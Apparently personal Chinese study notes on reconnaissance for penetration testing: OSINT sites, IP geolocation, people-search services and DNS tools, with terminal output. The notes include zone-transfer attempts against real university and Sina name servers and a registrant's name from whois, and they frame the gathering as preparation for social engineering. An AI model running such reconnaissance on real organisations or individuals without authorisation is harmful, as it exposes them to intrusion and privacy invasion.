@@ -1,0 +1,2080 @@
+原则：一切信息都是不完全可信的，即使经过验证也只是比较可信（上次拿到的怕是假的CSU数据库配置文件）
+信息搜集是为了两种利用1.直接使用2.社会工程学攻击
+搜集方式：被动（开源智能OSCINT/OSINT） 主动
+需要搜集的信息：公司内部构成与外部“接口”
+信息范围：IP地址段，各个域名信息及对应ip，服务器与防火墙信息，开放端口，邮箱、qq等网络联系方式，文档图片数据，公司地址，公司组织架构，联系电话/传真号码，人员姓名/职务，公开的商业信息（公司的业务），使用的电子设备信息（包括员工手机，网络摄像头如netbotz，Cisco交换机）。（设备信息、网络信息、联系方式、人员构成和使用设备信息、经营业务）
+
+
+被动信息搜集：
+可以使用的搜索引擎：baidu、google、yahoo、bing、dogpile（借助其他搜索引擎）、yandex.com
+可怕的搜索引擎（可以配合ip段进行使用）：shodan（www.shodan.io）、https://searchdns.netcraft.com/?host=139.224.232.240来获取操作系统类型、zoomeye.org
+可以信息搜集的社交平台：facebook、stream游戏平台、Twitter
+公司自己的官网说明、简介\产品购买网站
+网页中涉及部门选择的地方往往会一下子给出大部分部门的信息
+https://beta.companieshouse.gov.uk/
+http://siccode.com/en 可以通过SIC/NAICS号码来搜索（SIC+NAICS美国公司研究中用到的行业分类代码）
+
+
+
+DNS查询：
+	基本查询：nslookup dig dnsrecon
+			whois
+			dmitry, dnsrecon（goo模式能找的网页很少，估计和搜索条目限制有关系）, theharvester，BGP查询
+	AXFR：dig host dnsrecon
+	VERSION.BIND: dig
+	brt: dnsrecon（默认10线程，还可以自己指定线程个数） dnsmap foca scrapy.py
+	recon-ng，maltego
+EXIF：exif，foca，metagoofil
+netdiscover（-p passive）、p0f、wireshark
+firefox插件：whatruns（从包里能分析出来的，能分析出来的都分析出来了）
+
+baidu.com是域名
+www.baidu.com.是完全限定域名FQDN。也可以称为网站名、
+http://www.cnblogs.com/sddai/p/5703394.html
+主机记录叫做A记录 别名记录 cname（canonical name） 域名服务器记录 NS 邮件服务器 MX（邮件交换记录mail exchanger） IP反向解析域名 ptr  反垃圾邮件 SPF（ptr的利用）  RP 负责人记录  HINFO 记录提供电脑或操作系统的类型
+以上记录由DNS服务商提供A,CNAME,PTR,MX,RP，AXFR,IXFR，SOA（以及表示所有的ANY，这个应该是软件自己加上去的）
+baidu.com.最后一个.表示根域又称点域。根域并不知道所有，都是只知道下一级。
+主机-》本地ISP/公司域名服务器（缓存（有生存时间）与NS）
+DNS服务器里有一个叫SOA记录（权威记录，表示起始授权机构） 一个叫NS（Name Server）记录（域名服务器）关于其他DNS服务器的记录。
+SOA记录表明了DNS服务器之间的关系。SOA记录表明了谁是这个区域的所有者。比如51CTO.COM这个区域。一个DNS服务器安装后，需要创建一个区域，以后这个区域的查询解析，都是通过DNS服务器来完成的。现在来说一下所有者，我这里所说的所有者，就是谁对这个区域有修改权利。nslookup中的origin就是指SOA。
+DNS解析先向内网DNS服务器查询，再向外网？不，就是按照本机的/etc/resolv.conf里面的顺序进行。
+class=value
+   Change the query class to one of:
+	   IN（nslookup default）
+		   the Internet class
+	   CH
+		   the Chaos class
+	   HS
+		   the Hesiod class
+	   ANY
+		   wildcard
+
+
+IP:
+ip查询与定位：
+https://www.boip.net/ipv4/121.48.197.198  根据ip查询，得到ASN号码、whois信息
+https://www.boip.net/asn 根据ASN来查询
+ip.cn
+ip123.com
+ip138.com
+http://www.cz88.net/ 纯真
+http://ipinfo.io/  ：	AS4538 121.48.192.0/19  支持IPv6
+curl ipinfo.io会直接得到json数据，因为识别了User-Agent。
+http://ipinfo.io/json 这是Browser版json
+curl ipinfo.io/8.8.8.8
+http://ipinfo.io/8.8.8.8/json
+http://ip-api.com/json
+http://ip-api.com/json/208.80.152.201
+http://ip.taobao.com/service/getIpInfo.php?ip=121.48.207.129 可以查出来是教育网
+http://ip.cn-space.com/
+http://www.hao7188.com/
+http://ip.lockview.cn/
+我发现我的ISP查起来是Sichuan University这个可是个不错的定位
+
+IP精准定位：
+http://www.ipplus360.com/ 高精度（街道级别）
+https://www.opengps.cn/Data/IP/LocHighAcc.aspx
+http://lbs.amap.com/api/webservice/guide/api/ipconfig/ API
+http://lbsyun.baidu.com/index.php?title=webapi/ip-api  API
+https://www.ipip.net/customer.html 收费
+
+网站SSL证书在线监测：web.chacuo.net/netsslcheck（对SSL证书或者说CRT文件进行解码，http://web.chacuo.net/netssldecoder）
+
+HTML5定位：  wgs84标准 、gs84标准
+在HTML5的实现中，手机等移动设备当然优先使用GPS定位，而笔记本和部分平板，最准的定位是WIFI，至于网线上网的台式机，一般就只能使用IP来定位了，这个准确度最低。chrome和firefox就是用的google的位置服务。对于手机QQ浏览器，通过抓包，发现它访问的是腾讯自己的服务器
+http://www.cnblogs.com/ajianbeyourself/p/5295274.html
+http://blog.csdn.net/cuitang1031/article/details/55254286
+https://www.opengps.cn/Share/ShareLocation/Share.aspx  打开这个网站，浏览器就会询问允许获取位置
+
+MAC定位：http://samy.pl/mapxss/?mac=F0%3AB4%3A29%3AD0%3AF5%3AE2  F0-B4-29-D0-F5-E2
+最先技术成熟的是skyhook（苹果使用此公司wifi定位）和google
+通过XSS技术，在访问网站的时候获取router的MAC，并将之传递给自己的服务器，而后转交个Google Location Services。
+
+Wifi定位靠移动基站和AP热点的大量数据与信号强度
+
+以人名、号码或者地址定位：
+http://www.whitepages.com/（phonenumber.com）  美国为主
+http://www.411.com/  美国为主
+https://www.yellowpages.com/  估计也是外国，关键词搜索
+http://www.spydialer.com/（旧版本，仅支持人名搜索 http://www.blackbookonline.info/）
+网址链接着有一批公开犯罪记录搜索、人名搜搜、电话搜索
+http://www.blackbookonline.info/
+http://www.crimetime.com/
+
+社交网站：
+facebook.com
+myspace.com
+reunion.com
+classmates.com
+twitter.com
+专业社交网站/新闻组： 新闻组里面防火墙等的配置经常被复制
+linkedin.com
+plaxo.com
+职业规划网站：
+monster.com
+careerbuilder.com
+dice.com
+家族网站：
+ancestry.com
+照片管理网站：
+flickr.com
+photobucket.com
+商业服务（购买潜在用户信息、员工电话号码簿）
+jigsaw.com
+招聘网站： 称为注册企业就能获取大量简历
+monster.com
+careerbuilder.com
+近期重大事件：   搜索关键字：merge合并 acquisition获取 acquier收购和subsequent event后续事件
+上市公司必向证监会（Security and Exchange Commission SEC）定期提交多种报告（10Q季度报表 10K年度报表 20F外国公司在美市的信息公布或者年度报表）
+历史网站查看：	
+	多种搜索引擎的快照
+	www.archive.org/web/web.php
+
+https://www.robtex.com/dns-lookup/dart.scu.edu.cn 直接因为一个dns域名查出一堆信息
+https://builtwith.com/ 这个网站对网站构建所利用的技术查的很详细（甚至包括使用的编辑器），查询了以后还可以看自己使用的东东在全球的比例是占了多少
+网站备案：http://icp.chinaz.com/hellovega.cn
+如果数据没有收录你需要填一个验证码他会获取最新信息
+http://www.miitbeian.gov.cn/publish/query/indexFirst.action 坑爹，验证码我帮他输了。。。，不过这个比较容易出现业务繁忙而被挡在外面。记住对于个人网站，主办单位名称就是个人姓名
+同ip的域名查询：
+http://s.tool.chinaz.com/same
+http://reverseip.domaintools.com/ This is great！
+http://www.sitedossier.com/
+ip866.com这个网址不错，但是似乎挂了
+http://www.myipneighbors.com/
+
+http://www.yougetsignal.com/ ip查询、ip定位、whois查询、ip反向查域名、电话号码定位
+
+nslookup:	windows与linux都存在这个工具
+	root@kali:~# nslookup www.sina.com
+	Server:		192.168.3.2	
+	Address:	192.168.3.2#53 DNS解析地址
+
+	Non-authoritative answer:
+	www.sina.com	canonical name = us.sina.com.cn.
+	us.sina.com.cn	canonical name = news.sina.com.cn.
+	news.sina.com.cn	canonical name = jupiter.sina.com.cn.
+	jupiter.sina.com.cn	canonical name = cernetnews.sina.com.cn.
+	Name:	cernetnews.sina.com.
+	Address: 121.194.0.239
+	在nslookup交互模式里面可以暂时改变DNS服务器，在交互模式里面使用server 8.8.8.8。这样做可以得到不用地方的服务器IP。DNS现在较为智能，返回的是较近的服务器地址。
+	exit退出交互模式，一般linux下还有q，及系统的logout。	
+	root@kali:~# nslookup scu.edu.cn secdns.scu.edu.cn
+	Server:		secdns.scu.edu.cn
+	Address:	202.115.32.36#53
+
+	Name:	scu.edu.cn
+	Address: 202.115.32.82
+	Name:	scu.edu.cn
+	Address: 202.115.32.72
+	Name:	scu.edu.cn
+	Address: 202.115.32.83
+
+
+	goo的DNS8.8.8.8和8.8.4.4还有川大的dart.scu.edu.cn.都不行，需要使用代理转换为允许的ip进行查询才可以。
+	> server 8.8.8.8
+DNS request timed out.
+    timeout was 2 seconds.
+默认服务器:  [8.8.8.8]
+Address:  8.8.8.8
+	> server 8.8.4.4
+默认服务器:  google-public-dns-b.google.com
+Address:  8.8.4.4
+
+	通过川大教育网DNS和使用proxychains来查询外部DNS寻找scu.edu.cn的MX记录，找到了邮件系统的两个域名：（数字5表示MX优先级，MX优先级，用来指定邮件服务器接收邮件的先后顺序（1-50），一般默认设置为5、10、15等（数值越小优先级越高）。）
+root@kali:~# proxychains nslookup
+ProxyChains-3.1 (http://proxychains.sf.net)
+> server 8.8.8.8
+Default server: 8.8.8.8
+Address: 8.8.8.8#53
+> set type=mx
+> scu.edu.cn
+|DNS-request| ::1 
+|D-chain|-<>-127.0.0.1:7070-<><>-4.2.2.2:53-<><>-OK
+|DNS-response| ::1 is 198.105.244.11
+Server:		8.8.8.8
+Address:	8.8.8.8#53
+
+Non-authoritative answer:
+scu.edu.cn	mail exchanger = 5 scu.eyou.cn4e.com.
+
+root@kali:~# nslookup -type=mx scu.edu.cn secdns.scu.edu.cn
+Server:		secdns.scu.edu.cn
+Address:	202.115.32.36#53
+scu.edu.cn	mail exchanger = 5 gw.scu.edu.cn.
+之后通过搜索引擎批量寻找相关域名并进行ip解析，发现还有一个stu.scu.edu.cn指向邮件系统的ip。	
+
+
+	C:\Users\Administrator>nslookup
+	默认服务器:  phicomm.me
+	Address:  192.168.2.1
+	> set type=ptr
+	> server 202.96.209.133
+	默认服务器:  ns-pd.online.sh.cn
+	Address:  202.96.209.133
+	> 211.99.189.179
+	服务器:  ns-pd.online.sh.cn
+	Address:  202.96.209.133
+	非权威应答:
+	179.189.99.211.in-addr.arpa     name = mta1.china.com
+
+	nslookup是DNS查询工具（注意怎么制定要查询的DNS服务器）和dig一样。
+	使用nslookup和dig查询的时候不要加上协议。
+	root@kali:~# nslookup hellovega.cn
+	Server:		192.168.1.1
+	Address:	192.168.1.1#53
+	Name:	hellovega.cn
+	Address: 192.168.1.1
+	因为我的路由器名字就叫hellovega.cn，所以这时候只好www.hellovega.cn。不过不能加路径！
+	root@kali:~# nslookup www.hellovega.cn
+	Server:		192.168.1.1
+	Address:	192.168.1.1#53
+	Non-authoritative answer:
+	www.hellovega.cn	canonical name = www.hellovega.cn.cdn.dnsv1.com.
+	www.hellovega.cn.cdn.dnsv1.com	canonical name = 212.tc.sp.cdntip.com.
+	Name:	212.tc.sp.cdntip.com
+	Address: 58.216.106.174
+	Name:	212.tc.sp.cdntip.com
+	Address: 58.216.107.101
+
+	root@kali:~# nslookup
+	> server 8.8.4.4
+	Default server: 8.8.4.4
+	Address: 8.8.4.4#53
+	> type=any    
+	;; connection timed out; no servers could be reached
+	> server 8.8.8.8
+	Default server: 8.8.8.8
+	Address: 8.8.8.8#53
+	> type=any    （不一定有ANY这种非标准类型）
+	Server:		8.8.8.8
+	Address:	8.8.8.8#53
+	** server can't find type=any: NXDOMAIN
+	
+	windows:
+		nslookup [-opt ...] host        # 仅查找使用默认服务器的 "host"
+		nslookup [-opt ...] host server # 仅查找使用 "server" 的 "host"
+		C:\Users\Battery>nslookup
+		默认服务器:  PandoraBox.lan
+		Address:  192.168.1.1
+
+		> www.sina.com
+		服务器:  PandoraBox.lan
+		Address:  192.168.1.1
+
+		非权威应答:
+		名称:    cernetnews.sina.com.cn//说The request or reply is too large.访问不了
+		Address:  121.194.0.239
+		Aliases:  www.sina.com//自动层级化查询，cname解析成下一个,前提是你一层层查过了它的cname先，然后会被本地给记录下来。
+				  us.sina.com.cn//cname解析成下一个
+				  news.sina.com.cn//cname解析成下一个
+				  jupiter.sina.com.cn//曾说The request or reply is too large.访问不了
+
+		>set type（或者q）=a（或者mx，ns，ptr，any） 相当于nslookup -type=a（或者mx，ns，ptr，any）
+		这个命令用来指定要返回的东东，默认情况下是A记录或者Cname记录
+
+		同一个URL，设置了多个服务器（可能是在不同地方），多个IP共享使用一个域名。川大的话scu.edu.cn有两个ip是因为双线路。
+		将nslookup的type设置为ns以后（最好进交互模式），想要查川大的nameserver ip，不过对zhjw.scu.edu.cn查没有查出来，然后就查scu.edu.cn查到了，确实是这样scu.edu.cn才是host，而zhjw.只是子域名。
+		nslookup  -type=ns scu.edu.cn
+		dig +noall +answer ns scu.edu.cn 
+
+
+		注意windows下指定服务器的使用
+		C:\Users\Administrator>nslookup www.sina.com 8.8.8.8
+		服务器:  google-public-dns-a.google.com
+		Address:  8.8.8.8
+
+		非权威应答:
+		名称:    www.sina.com
+		Address:  113.215.6.153
+		我在家里使用K2路由器，设置type=cname以后，发现只解析了一次，不会一直自动解析下去，sina的cname记录中间也发生了一点变化。
+
+
+dig命令：
+	直接dig命令就是查看当前如果dig的话会是什么设置，其中包括当前会使用的DNS服务器192.168.1.1
+	any对于当前域名的所有记录
+	@8.8.8.8 指定dns
+	+noall 什么结果都不输出（和+answer一起使用，这样就去掉了一些统计信息、版本信息等只保留我们需要的）
+	+answer 只看结果（比使用any多了一点点AUTHORITY SECTION）
+	-x 反向查询（但是不一定理你，这样就time out了）
+
+	dig 163.com mx 看mx记录
+	root@kali:~# dig +noall +answer www.sina.com
+	www.sina.com.		5	IN	A	113.215.6.153
+	root@kali:~# dig +noall +answer www.sina.com cname 只会查一下
+	www.sina.com.		5	IN	CNAME	us.sina.com.cn.
+	新浪已经在做改变了，本来是cname记录的，后来直接用了a记录
+	root@kali:~# dig +noall +answer www.sina.com.cn
+	www.sina.com.cn.	5	IN	CNAME	jupiter.sina.com.cn.
+	jupiter.sina.com.cn.	5	IN	A	113.215.6.218
+	不过www.sina.com.cn才是网址
+	然后某一天，我再dig就是这个样子：
+	root@kali:~# dig +noall +answer www.sina.com.cn
+	www.sina.com.cn.	3569	IN	CNAME	jupiter.sina.com.cn.
+	jupiter.sina.com.cn.	37	IN	CNAME	cernetnews.sina.com.cn.
+	cernetnews.sina.com.cn.	37	IN	A	121.194.0.239
+	root@kali:~# dig +noall +answer www.sina.com.cn cname
+	www.sina.com.cn.	3565	IN	CNAME	jupiter.sina.com.cn.
+	root@kali:~# dig +noall +answer www.sina.com.cn a #原dig A记录就是默认状态，默认一层层查下去
+	www.sina.com.cn.	3571	IN	CNAME	jupiter.sina.com.cn.
+	jupiter.sina.com.cn.	37	IN	CNAME	cernetnews.sina.com.cn.
+	cernetnews.sina.com.cn.	37	IN	A	121.194.0.239
+	下面是nslookup查到的结果：
+	root@kali:~# nslookup www.sina.com.cn
+	Server:		192.168.1.1
+	Address:	192.168.1.1#53
+	Non-authoritative answer:
+	www.sina.com.cn	canonical name = jupiter.sina.com.cn.
+	jupiter.sina.com.cn	canonical name = cernetnews.sina.com.cn.
+	Name:	cernetnews.sina.com.cn
+	Address: 121.194.0.239
+
+	不能查到一些域名的ns记录，说明他就没有自己的ns也没有开启CDN。而是直接一条A记录。
+
+	大部分DNS服务器使用的都是bind，FQDN不会被dig查出来。知道FQDN，可以攻破DNS服务器，或者站长工具进行大致了解。(BIND：全称是Berkeley Internet Name Domain（伯克利因特网名字域系统）。BIND非常消耗内存。它的数据库都保留在内存中)
+	dig +noall +answer txt chaos VERSION.BIND 网站域名或者ip地址或者@dns（ip或者域名），VERSION.BIND不可小写，这是约定了的字段名.还有网站域名要放在最后！
+	txt是记录类型，bind的版本信息记录对应的类是chaos（之前讲的都是internet类）。不过你不一定能得到回复，如果失败就没有返回内容。
+	FQDN：完全合格域名（FQDN）：点结尾的域名。合格是qualified
+
+	dig +trace 域名 可以显示查询过程（发包过程）
+	用wireshark进行抓包了解过程：
+	所有缓存服务器都会有13个根域服务器记录。
+	首先本机（没有存根域，但是存了路由器）向本地DNS发出对根域DNS的查询（路由器有存）：
+	Queries：
+		<Eoot>:type NS, class IN    class IN就是internet。
+	Additional records：
+		<Root>: type OPT
+	本地DNS返回
+	Queries
+		<Root>: type NS, class IN
+	Answers
+			<Root>: type NS, class IN, ns d.root-servers.net
+			<Root>: type NS, class IN, ns k.root-servers.net
+			<Root>: type NS, class IN, ns h.root-servers.net
+			<Root>: type NS, class IN, ns b.root-servers.net
+			<Root>: type NS, class IN, ns c.root-servers.net
+			<Root>: type NS, class IN, ns l.root-servers.net
+			<Root>: type NS, class IN, ns a.root-servers.net
+			<Root>: type NS, class IN, ns i.root-servers.net
+			<Root>: type NS, class IN, ns m.root-servers.net
+			<Root>: type NS, class IN, ns e.root-servers.net
+			<Root>: type NS, class IN, ns j.root-servers.net
+			<Root>: type NS, class IN, ns f.root-servers.net
+			<Root>: type NS, class IN, ns g.root-servers.net
+			<Root>: type RRSIG, class IN
+	Additional records：所有13个根域DNS的IPv4和IPv6
+			a.root-servers.net: type A, class IN, addr 198.41.0.4		    A记录是IPv4
+			a.root-servers.net: type AAAA, class IN, addr 2001:503:ba3e::2:30   4A记录是IPv6
+			b.root-servers.net: type A, class IN, addr 192.228.79.201
+			b.root-servers.net: type AAAA, class IN, addr 2001:500:84::b
+			c.root-servers.net: type A, class IN, addr 192.33.4.12
+			c.root-servers.net: type AAAA, class IN, addr 2001:500:2::c
+			d.root-servers.net: type A, class IN, addr 199.7.91.13
+			d.root-servers.net: type AAAA, class IN, addr 2001:500:2d::d
+			e.root-servers.net: type A, class IN, addr 192.203.230.10
+			e.root-servers.net: type AAAA, class IN, addr 2001:500:a8::e
+			f.root-servers.net: type A, class IN, addr 192.5.5.241
+			f.root-servers.net: type AAAA, class IN, addr 2001:500:2f::f
+			g.root-servers.net: type A, class IN, addr 192.112.36.4
+			g.root-servers.net: type AAAA, class IN, addr 2001:500:12::d0d
+			h.root-servers.net: type A, class IN, addr 198.97.190.53
+			h.root-servers.net: type AAAA, class IN, addr 2001:500:1::53
+			i.root-servers.net: type A, class IN, addr 192.36.148.17
+			i.root-servers.net: type AAAA, class IN, addr 2001:7fe::53
+			j.root-servers.net: type A, class IN, addr 192.58.128.30
+			j.root-servers.net: type AAAA, class IN, addr 2001:503:c27::2:30
+			k.root-servers.net: type A, class IN, addr 193.0.14.129
+			k.root-servers.net: type AAAA, class IN, addr 2001:7fd::1
+			l.root-servers.net: type A, class IN, addr 199.7.83.42
+			l.root-servers.net: type AAAA, class IN, addr 2001:500:9f::42
+			m.root-servers.net: type A, class IN, addr 202.12.27.33
+			m.root-servers.net: type AAAA, class IN, addr 2001:dc3::35
+			<Root>: type OPT
+	随机选中一个DNS（a-m），分别发两个包进行查询（两个包都没有Additional records）：
+	Queries：
+		d.root-servers.net: type A, class IN
+	Queries：
+		d.root-servers.net: type AAAA, class IN
+	返回两个包：
+	Answers
+		d.root-servers.net: type AAAA, class IN, addr 2001:500:2d::d
+	Authoritative nameservers
+		root-servers.net: type NS, class IN, ns g.root-servers.net
+		root-servers.net: type NS, class IN, ns m.root-servers.net
+		root-servers.net: type NS, class IN, ns c.root-servers.net
+		root-servers.net: type NS, class IN, ns i.root-servers.net
+		root-servers.net: type NS, class IN, ns d.root-servers.net
+		root-servers.net: type NS, class IN, ns b.root-servers.net
+		root-servers.net: type NS, class IN, ns k.root-servers.net
+		root-servers.net: type NS, class IN, ns h.root-servers.net
+		root-servers.net: type NS, class IN, ns a.root-servers.net
+		root-servers.net: type NS, class IN, ns l.root-servers.net
+		root-servers.net: type NS, class IN, ns f.root-servers.net
+		root-servers.net: type NS, class IN, ns j.root-servers.net
+		root-servers.net: type NS, class IN, ns e.root-servers.net
+	Additional records：没有d的IPv6地址，但是查的是4A记录
+		a.root-servers.net: type A, class IN, addr 198.41.0.4
+		a.root-servers.net: type AAAA, class IN, addr 2001:503:ba3e::2:30
+		b.root-servers.net: type A, class IN, addr 192.228.79.201
+		b.root-servers.net: type AAAA, class IN, addr 2001:500:84::b
+		c.root-servers.net: type A, class IN, addr 192.33.4.12
+		c.root-servers.net: type AAAA, class IN, addr 2001:500:2::c
+		d.root-servers.net: type A, class IN, addr 199.7.91.13
+		e.root-servers.net: type A, class IN, addr 192.203.230.10
+		e.root-servers.net: type AAAA, class IN, addr 2001:500:a8::e
+		f.root-servers.net: type A, class IN, addr 192.5.5.241
+		f.root-servers.net: type AAAA, class IN, addr 2001:500:2f::f
+
+	Answers
+		d.root-servers.net: type A, class IN, addr 199.7.91.13
+	Authoritative nameservers  没有d的IPv4地址，但是查的是A记录
+		root-servers.net: type NS, class IN, ns l.root-servers.net
+		root-servers.net: type NS, class IN, ns e.root-servers.net
+		root-servers.net: type NS, class IN, ns a.root-servers.net
+		root-servers.net: type NS, class IN, ns j.root-servers.net
+		root-servers.net: type NS, class IN, ns g.root-servers.net
+		root-servers.net: type NS, class IN, ns k.root-servers.net
+		root-servers.net: type NS, class IN, ns d.root-servers.net
+		root-servers.net: type NS, class IN, ns f.root-servers.net
+		root-servers.net: type NS, class IN, ns i.root-servers.net
+		root-servers.net: type NS, class IN, ns h.root-servers.net
+		root-servers.net: type NS, class IN, ns c.root-servers.net
+		root-servers.net: type NS, class IN, ns b.root-servers.net
+		root-servers.net: type NS, class IN, ns m.root-servers.net
+	Additional records
+		a.root-servers.net: type A, class IN, addr 198.41.0.4
+		a.root-servers.net: type AAAA, class IN, addr 2001:503:ba3e::2:30
+		b.root-servers.net: type A, class IN, addr 192.228.79.201
+		b.root-servers.net: type AAAA, class IN, addr 2001:500:84::b
+		c.root-servers.net: type A, class IN, addr 192.33.4.12
+		c.root-servers.net: type AAAA, class IN, addr 2001:500:2::c
+		d.root-servers.net: type AAAA, class IN, addr 2001:500:2d::d
+		e.root-servers.net: type A, class IN, addr 192.203.230.10
+		e.root-servers.net: type AAAA, class IN, addr 2001:500:a8::e
+		f.root-servers.net: type A, class IN, addr 192.5.5.241
+		f.root-servers.net: type AAAA, class IN, addr 2001:500:2f::f
+	之后再随机选中再查，直到a-f根域都被查过一遍，但是目前只有
+	g-k这部分的返回不管你是查A还是他们的4A记录，得到的Additional records里面少掉的都是最后一行。
+
+	随机选一个root-server.net查gtld-server.net，随机地将13个gtld-server.net都查一遍不管是A还是4A。对于.cn顶级域的域名，查的是ns1.xxx.cn、c.dns.cn.等也是随机遍历一遍。
+	Queries
+		g.gtld-servers.net: type A, class IN
+			Name: g.gtld-servers.net
+			[Name Length: 18]
+			[Label Count: 3]
+			Type: A (Host Address) (1)
+			Class: IN (0x0001)
+
+	Queries
+		g.gtld-servers.net: type AAAA, class IN
+			Name: g.gtld-servers.net
+			[Name Length: 18]
+			[Label Count: 3]
+			Type: AAAA (IPv6 Address) (28)
+			Class: IN (0x0001)
+	返回：
+	Queries
+		g.gtld-servers.net: type A, class IN
+			Name: g.gtld-servers.net
+			[Name Length: 18]
+			[Label Count: 3]
+			Type: A (Host Address) (1)
+			Class: IN (0x0001)
+	Answers
+		g.gtld-servers.net: type A, class IN, addr 192.42.93.30
+			Name: g.gtld-servers.net
+			Type: A (Host Address) (1)
+			Class: IN (0x0001)
+			Time to live: 5
+			Data length: 4
+			Address: 192.42.93.30
+	Authoritative nameservers
+		gtld-servers.net: type NS, class IN, ns av3.nstld.com
+			Name: gtld-servers.net
+			Type: NS (authoritative Name Server) (2)
+			Class: IN (0x0001)
+			Time to live: 5
+			Data length: 15
+			Name Server: av3.nstld.com
+		gtld-servers.net: type NS, class IN, ns av4.nstld.com
+			Name: gtld-servers.net
+			Type: NS (authoritative Name Server) (2)
+			Class: IN (0x0001)
+			Time to live: 5
+			Data length: 6
+			Name Server: av4.nstld.com
+		gtld-servers.net: type NS, class IN, ns av1.nstld.com
+			Name: gtld-servers.net
+			Type: NS (authoritative Name Server) (2)
+			Class: IN (0x0001)
+			Time to live: 5
+			Data length: 6
+			Name Server: av1.nstld.com
+		gtld-servers.net: type NS, class IN, ns av2.nstld.com
+			Name: gtld-servers.net
+			Type: NS (authoritative Name Server) (2)
+			Class: IN (0x0001)
+			Time to live: 5
+			Data length: 6
+			Name Server: av2.nstld.com
+	PS：13个通用顶级域（英语：Generic top-level domain，gTLD）是供一些特定组织使用的顶级域，以其代表组织英文名称的头几个英文字母代表，如.com代表商业机构，可以视为com这些域的域名服务器。那么nstld就是ns的顶级域，nstld出现在gtld的Authoritative nameservers。
+
+	如果差dig +trace查的是.cn那么不是想gtld，而是向a.dns.cn-e.dns.cn，不过Authoritative nameservers中还有ns.cernet.net。然后就会向本地NDS服务器查询Authoritative nameservers中所有域名的IPv4和IPv6地址。选择了其中之一（自然包括ns.cernet.net，不然发过来干嘛）发送type为A记录的DNS查询包。返回sina自家的域名服务器列表，然后再向本地一个个查询，最后向其中一个发出www.sina.cn的A记录查询
+
+	随机选一个gtld对sina.com进行查询，返回sina所有的DNS服务器域名。对于www.baidu.com则是给出了cname和A记录于是dig显示“答案”（不过百度是有自己的域名服务器的，whois可知）。
+	然后电脑会通过得到的ns域名向本地DNS查询（我是用了NAT，当时gateway是192.168.56.2，电脑IP192.168.56.188）出所有sina的NS服务器ip。（这一块还是要出现递归查询的）
+	最后就是随机选一个向sina的DNS服务器查询www.sina.com的IP
+	返回一个www.sina.com的cname和A记录包，被dig命令显示在终端。
+
+	综上来讲就是本机自己做了迭代查询来代替开始的一部分递归查询，让整个DNS服务器地址获取过程都清晰可见，从而结合真正应该的过程可以方便判断哪一级出了问题，像劫持。
+
+	并不是13台物理服务器，而是13个逻辑服务器节点。因为DNS通讯常见用UDP做传输层，？UDP包大小限制了只能传输13个地址，512字节？。这13个固定IP是任播IP，实际对应全球现4、百个服务器任播镜像点，然后找这个IP时路由会将你指向最近响应的节点上。
+	root@kali:~# dig +noall +answer les1ie.cf
+	les1ie.cf.		37	IN	A	151.101.24.133
+	root@kali:~# dig +noall +answer cyzus.github.io
+	cyzus.github.io.	1148	IN	CNAME	github.map.fastly.net.
+	github.map.fastly.net.	22	IN	A	151.101.24.133
+	确定他这是github博客加上个人免费域名。于是自带了github.map.fastly.net.这个Fastly CDN节点。
+	得知我这里访问github那么都是访问这个新加坡节点咯。
+	
+AXFR：
+	我们使用区域传输（本来用来DNS服务器同步，正常情况下只会在本域内部里面进行同步，但是配置可能出错）
+	axfr就是差异化记录的传输即区域传输，will lists all hosts in a domain
+	host -T -Z          l sina.com ns2.sina.com  这两条命令都是区域传输，据说都试试没准另外一条就可以使用
+	-T TCP mode
+	-l axfr
+	dig sina.com ns然后选一个ns服务器
+	dig @ns2.sina.com sina.com axfr  要这个域下的所有子域（dig sina.com ns 既可以知道其域名服务器的域名）
+	同步指定DNS服务器上指定域名下的一切子域名。
+	dnsrecon -t axfr -d xxx.com
+
+	区域传输的时候使用的tcp#53（udp#53只是用来DNS查询），所以host需要使用-T
+	Queries里面的type变成AXFR了。
+
+	root@kali:~# host -T -l scu.edu.cn dart.scu.edu.cn.
+	Using domain server:
+	Name: dart.scu.edu.cn.
+	Address: 202.115.32.39#53
+	Aliases: 
+
+	Host scu.edu.cn not found: 5(REFUSED)
+	; Transfer failed. #用nslookup和dnsrecon都是Transfer failed
+	root@kali:~# host -T -l sina.com ns1.sina.com
+	;; communications error to 114.134.80.144#53: end of file
+
+	root@kali:~# host -T -l qmsdiy.com 8.8.8.8
+	Using domain server:
+	Name: 8.8.8.8
+	Address: 8.8.8.8#53
+	Aliases: 
+	Host qmsdiy.com not found: 2(SERVFAIL)
+	; Transfer failed.
+	一关端口我就差不到了，虽然8.8.8.8是有防护的
+
+	root@kali:~# dnsrecon -taxfr -d scu.edu.cn 
+[*] Testing NS Servers for Zone Transfer
+[*] Checking for Zone Transfer for scu.edu.cn name servers
+[*] Resolving SOA Record
+[*] 	 SOA dart.scu.edu.cn 202.115.32.39
+[*] Resolving NS Records
+[*] NS Servers found:
+[*] 	NS dart.scu.edu.cn 202.115.32.39
+[*] 	NS secdns.scu.edu.cn 202.115.32.36
+[*] Removing any duplicate NS server IP Addresses...
+[*]  
+[*] Trying NS server 202.115.32.36
+[*] 202.115.32.36 Has port 53 TCP Open
+[-] Zone Transfer Failed!
+[-] No answer or RRset not for qname
+[*]  
+[*] Trying NS server 202.115.32.39
+[-] Zone Transfer Failed for 202.115.32.39!
+[-] Port 53 TCP is being filtered
+	
+
+whois：查询注册信息与是否使用了CDN
+	whois  IP或域名 -h whois.apnic.net #应该需要翻墙
+	APRIN对查到的whois信息要求很严格，不准哪里做广告定位，不准拿来传播等等，其他的我没看
+	-h指定使用哪家的whois
+	查了一个还会告诉你哪里还能查到，不过反正我遍历
+
+	域名注册信息查询：whois 命名的话就把www改为whois
+	NIC（地址分配，域名信息）
+	AFRINIC www.afrinic.net
+	APNIC www.apnic.net
+	ARIN www.arin.net
+	IANA www.iana.org
+	ICANN www.icann.org
+	LACNIC www.lacnic.net
+	NRO www.nro.net
+	RIPE www.ripe.net
+	InterNic www.internic.net
+	
+
+	whois搜索引擎交互版本：
+	http://wq.apnic.net/apnic-bin/whois.pl 
+	http://whois.domaintools.com/hellovega.cn
+	https://ewhois.cnnic.cn/WelcomeServlet CNNIC的国家域名whois
+	发现命令如果使用了-h 查域名都不怎么能查出来，查ip，一查就是一个/8大段。不使用的话情况正常。
+	root@kali:~# whois hellovega.cn
+	Domain Name: hellovega.cn
+	ROID: 20170221s10001s88289733-cn
+	Domain Status: ok
+	Registrant ID: us636lflb9tt4r
+	Registrant: 李培男  #开了域名信息保护，能查到的只有户主的名字
+	Registrant Contact Email: whoisprotect@dnspod.com
+	Sponsoring Registrar: 北京新网数码信息技术有限公司
+	Name Server: f1g1ns1.dnspod.net
